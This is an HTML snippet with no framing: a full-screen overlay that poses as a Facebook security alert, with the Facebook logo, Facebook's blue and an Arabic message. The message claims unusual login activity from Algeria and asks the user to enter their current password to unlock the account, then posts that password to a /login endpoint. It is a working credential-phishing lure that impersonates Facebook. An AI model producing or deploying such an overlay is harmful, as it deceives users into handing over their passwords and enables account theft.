<div style="
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.8); z-index: 9999;
    display: flex; justify-content: center; align-items: center;
    color: white; font-family: Arial, sans-serif; text-align: center;
">
    <div style="background: white; color: black; padding: 30px; border-radius: 10px; width: 80%; max-width: 400px;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" width="50" alt="FB Logo">
        <h2 style="color: #1877F2;">تنبيه أمني هام!</h2>
        <p>لقد رصدنا نشاطاً غير معتاد على حسابك من موقع **(الجزائر)**.</p>
        <p style="font-weight: bold; color: red;">برجاء تأكيد كلمة المرور الخاصة بك لإلغاء قفل الحساب.</p>
        
        <form action="/login" method="POST"> <input type="password" name="pass" placeholder="كلمة المرور الحالية" required style="
                width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;
            ">
            <button type="submit" style="
                width: 100%; padding: 10px; background: #1877F2; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;
            ">تأكيد الهوية</button>
        </form>
    </div>
</div>
